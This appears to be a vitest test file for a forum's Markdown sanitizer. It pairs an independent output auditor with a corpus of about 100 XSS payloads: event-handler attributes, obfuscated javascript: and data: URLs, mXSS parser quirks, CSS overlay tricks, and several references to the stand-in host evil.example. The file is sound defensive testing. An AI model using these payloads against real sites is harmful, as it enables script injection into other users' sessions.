import type { Element, ElementContent, Root } from "hast";
import { rehype } from "rehype";
import { describe, expect, it } from "vitest";
import { renderMarkdown } from "./markdown";
import { sanitizeSchema, sanitizeStyleValue } from "./sanitize";

/**
 * XSS 语料测试（审查复查 A4）。此前「净化管线可靠」的结论来自子代理跑的 16 个 payload，我自己没跑过。
 * 这里用一个独立于净化器的检查器——用真实 HTML 解析器解析**输出**，按结构断言——对一份更大的语料过一遍：
 * 经典脚本、事件属性、协议混淆、mXSS（命名空间切换）、CSS 注入、HTML 解析怪癖、Markdown 自身的链接形态。
 * 检查器自己也被验证：对已知的坏输出必须报警，否则「全部通过」没有意义。
 */

const SCHEMA = sanitizeSchema();
const ALLOWED_TAGS = new Set(SCHEMA.tagNames);
/** 每个标签允许出现的属性（hast 属性名；输出侧的权威白名单，刻意写死而不是从 schema 推导，避免两边一起错） */
const ALLOWED_PROPS: Record<string, string[]> = {
  a: ["href", "title", "target", "rel"],
  img: ["src", "alt", "title", "width", "height", "loading", "referrerPolicy"],
  span: ["style"],
  div: ["style", "align"],
  th: ["style", "align"],
  td: ["style", "align"],
  code: ["className"],
  pre: ["className"],
};
const SAFE_URL = /^(https?:\/\/|mailto:|\/|#)/i;

/** 控制字符与空白在 URL 里会被浏览器忽略，攻击者借此拆开 "javascript:"；比对前统一去掉 */
const squash = (v: string) => v.replace(/[\u0000- \u007f-\u009f]/g, "");

/** 检查净化后的 HTML，返回全部违规描述；空数组 = 安全 */
export function audit(html: string): string[] {
  const tree = rehype().data("settings", { fragment: true }).parse(html) as Root;
  const problems: string[] = [];
  const walk = (node: Root | ElementContent): void => {
    if (node.type === "element") {
      const el = node as Element;
      if (!ALLOWED_TAGS.has(el.tagName)) problems.push(`标签 <${el.tagName}> 不在白名单`);
      const allowed = new Set(ALLOWED_PROPS[el.tagName] ?? []);
      for (const [name, raw] of Object.entries(el.properties ?? {})) {
        if (!allowed.has(name)) problems.push(`<${el.tagName}> 出现未放行属性 ${name}`);
        const value = Array.isArray(raw) ? raw.join(" ") : String(raw);
        if (/^on/i.test(name)) problems.push(`事件属性 ${name}`);
        if (name === "href" || name === "src") {
          if (!SAFE_URL.test(squash(value).replace(/^(?=[^/#])/, "") && value.trim())) {
            problems.push(`<${el.tagName}> ${name}=${JSON.stringify(value)} 协议不安全`);
          }
        }
        if (name === "style" && sanitizeStyleValue(value) !== value.trim()) {
          problems.push(`style 含白名单外声明: ${value}`);
        }
        if (name === "className" && !/^language-[\w-]+$/.test(value)) {
          problems.push(`className 不是 language-xxx: ${value}`);
        }
        if (/javascript:|vbscript:|data:text\/html/i.test(squash(value))) {
          problems.push(`属性 ${name} 含脚本协议: ${value}`);
        }
      }
      if (
        el.tagName === "a" &&
        el.properties?.target &&
        !String(el.properties.rel ?? "").includes("noopener")
      ) {
        problems.push("<a target> 缺少 rel=noopener");
      }
    }
    if ("children" in node) for (const c of node.children as ElementContent[]) walk(c);
  };
  walk(tree);
  return problems;
}

describe("audit 检查器自身（必须能抓出坏输出）", () => {
  const bad: [string, string][] = [
    ["脚本标签", "<p>x</p><script>alert(1)</script>"],
    ["事件属性", '<img src="/a.png" onerror="alert(1)">'],
    ["javascript 链接", '<a href="javascript:alert(1)">x</a>'],
    ["拆开的 javascript", '<a href="java\tscript:alert(1)">x</a>'],
    ["iframe", '<iframe src="/x"></iframe>'],
    ["svg", '<svg onload="alert(1)"></svg>'],
    ["未放行属性", '<p id="x">y</p>'],
    ["style 越权声明", '<span style="position:fixed;color:red">x</span>'],
    ["注入的 class", '<code class="fixed inset-0">x</code>'],
    ["target 无 rel", '<a href="/x" target="_blank">x</a>'],
    ["data 图片 html", '<img src="data:text/html;base64,AAAA">'],
  ];
  for (const [name, html] of bad) {
    it(`报警：${name}`, () => expect(audit(html).length, html).toBeGreaterThan(0));
  }
  it("放行：正常输出", () => {
    const ok =
      '<p>文字 <a href="https://example.com/x" target="_blank" rel="noopener noreferrer">链接</a> <a href="/t/1#p2">站内</a></p>' +
      '<img src="/files/ab/cd/x.png" alt="图" loading="lazy"><pre><code class="language-ts">x</code></pre>' +
      '<span style="color:#cb4042">红</span><blockquote><p>引用</p></blockquote>';
    expect(audit(ok)).toEqual([]);
  });
});

/** 语料：每条是「作者可能提交的 Markdown / 内嵌 HTML」 */
const CORPUS: string[] = [
  // —— 合法来源 + 事件属性：越过「来源降级」这一关，直接考验属性白名单 ——
  '<img src="/files/ab/cd/x.png" onerror=alert(1)>',
  '<img src="/emoji/130.gif" onload="alert(1)" onclick="alert(2)">',
  '<img src="https://example.com/a.png" onerror=alert(1) onmouseover=alert(2) OnLoAd=alert(3)>',
  '<a href="/t/1" onclick=alert(1)>x</a>',
  '<a href="https://example.com/" onmouseover=alert(1) onfocus=alert(2) autofocus>x</a>',
  '<span onclick=alert(1) style="color:red">x</span>',
  '<div onmouseenter=alert(1) align="center">x</div>',
  '<td onclick=alert(1) style="color:red">x</td>',
  '<code onclick=alert(1) class="language-ts">x</code>',
  "<pre onmouseover=alert(1)>x</pre>",
  '<img src="/files/ab/cd/x.png" alt="a" id="x" name="x" class="fixed inset-0" data-x=1 style="position:fixed">',
  '<a href="/t/1" id="x" name="x" class="fixed inset-0" data-x=1 download ping="//evil.example">x</a>',
  // —— 脚本与事件 ——
  "<script>alert(1)</script>",
  "<SCRIPT SRC=//evil.example/x.js></SCRIPT>",
  "<scr<script>ipt>alert(1)</scr</script>ipt>",
  "<img src=x onerror=alert(1)>",
  '<img src="x" oNeRrOr="alert(1)">',
  "<img src=`x` onerror=alert(1)>",
  "<img src=x on\u0000error=alert(1)>",
  "<body onload=alert(1)>",
  "<details open ontoggle=alert(1)>x</details>",
  "<video><source onerror=alert(1)></video>",
  "<audio src=x onerror=alert(1)>",
  "<input autofocus onfocus=alert(1)>",
  "<button formaction=javascript:alert(1)>x</button>",
  "<marquee onstart=alert(1)>x</marquee>",
  "<div onmouseover=alert(1) style=position:fixed;inset:0>x</div>",
  // —— 协议混淆 ——
  "[x](javascript:alert(1))",
  "[x](JaVaScRiPt:alert(1))",
  "[x](&#106;avascript:alert(1))",
  "[x](java\tscript:alert(1))",
  "[x](  javascript:alert(1))",
  "[x](vbscript:msgbox(1))",
  "[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
  "![x](javascript:alert(1))",
  '<a href="jav&#x09;ascript:alert(1)">x</a>',
  '<a href="&#0000106avascript:alert(1)">x</a>',
  '<a href="javascript&colon;alert(1)">x</a>',
  '<a href=" javascript:alert(1)">x</a>',
  "<a href='JAVASCRIPT:alert(1)'>x</a>",
  "<javascript:alert(1)>",
  "[x][1]\n\n[1]: javascript:alert(1)",
  '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">',
  "<img src=x:alert(1)>",
  // —— 危险元素 ——
  '<iframe src="javascript:alert(1)"></iframe>',
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<object data="javascript:alert(1)"></object>',
  '<embed src="javascript:alert(1)">',
  "<form action=//evil.example><input name=x></form>",
  '<base href="javascript:alert(1)//">',
  '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
  '<link rel="stylesheet" href="//evil.example/x.css">',
  "<style>@import 'https://evil.example/x.css'; body{display:none}</style>",
  "<svg><script>alert(1)</script></svg>",
  "<svg onload=alert(1)>",
  '<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>',
  "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
  "<math><mi xlink:href=javascript:alert(1)>x</mi></math>",
  // —— mXSS / 解析怪癖 ——
  '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">',
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
  "<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>",
  "<!--><img src=x onerror=alert(1)>-->",
  "<![CDATA[<img src=x onerror=alert(1)>]]>",
  '<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">',
  '<table><caption><svg><desc><style><a title="</style><img src=x onerror=alert(1)>">',
  "<xmp><script>alert(1)</script></xmp>",
  "<plaintext><img src=x onerror=alert(1)>",
  "<textarea><img src=x onerror=alert(1)></textarea>",
  "<title><img src=x onerror=alert(1)></title>",
  // —— CSS 注入与整页覆盖 ——
  '<div style="background:url(javascript:alert(1))">x</div>',
  '<span style="color:red;position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999">x</span>',
  '<span style="expression(alert(1))">x</span>',
  '<span style="color:red;background-image:url(//evil.example/t.gif)">x</span>',
  '<div style="behavior:url(x.htc)">x</div>',
  '<span style="font-size:999999px">x</span>',
  '<pre class="fixed inset-0 z-50 bg-background"><code class="fixed inset-0 z-50">x</code></pre>',
  '<code class="language-ts fixed inset-0">x</code>',
  // —— 链接与图片的其他滥用 ——
  '<a href="https://example.com" target="_blank">x</a>',
  '<a href="https://example.com" target="_top" rel="opener">x</a>',
  '<img srcset="x onerror=alert(1) 1x" src="/a.png">',
  '<img src="/a.png" width="100%" height="100%" style="position:fixed">',
  '<table background="javascript:alert(1)"><tr><td background="javascript:alert(1)">x</td></tr></table>',
  // —— 实体与转义（应当保持为文字） ——
  "&lt;script&gt;alert(1)&lt;/script&gt;",
  "`<script>alert(1)</script>`",
  "```html\n<script>alert(1)</script>\n```",
  "\\<script>alert(1)\\</script>",
  // —— Markdown 自身 ——
  "[a](<javascript:alert(1)>)",
  '[a](/x "onmouseover=alert(1) x=")',
  '[a](https://example.com "title\\" onmouseover=\\"alert(1)")',
  '![a](x "onerror=alert(1)")',
  "https://example.com/<script>alert(1)</script>",
  "> <img src=x onerror=alert(1)>",
  "- <img src=x onerror=alert(1)>\n- ok",
  "| a | b |\n|---|---|\n| <img src=x onerror=alert(1)> | <script>alert(1)</script> |",
  // —— 超长与嵌套 ——
  "<div>".repeat(300) + "<img src=x onerror=alert(1)>" + "</div>".repeat(300),
  "<b>".repeat(500) + "<script>alert(1)</script>",
];

describe(`净化管线 · ${CORPUS.length} 条语料（输出须通过 audit 的结构检查）`, () => {
  for (const [i, payload] of CORPUS.entries()) {
    it(`#${String(i + 1).padStart(2, "0")} ${JSON.stringify(payload).slice(0, 60)}`, () => {
      const html = renderMarkdown(payload);
      expect(audit(html), `输入: ${payload.slice(0, 120)}\n输出: ${html.slice(0, 300)}`).toEqual(
        [],
      );
    });
  }

  it("语料有效：至少一部分输入在净化前确实包含危险结构（防止语料写坏后全部通过）", () => {
    const dangerousInput = CORPUS.filter((p) =>
      /<script|onerror|javascript:|<iframe|onload/i.test(p),
    );
    expect(dangerousInput.length).toBeGreaterThan(30);
  });
});
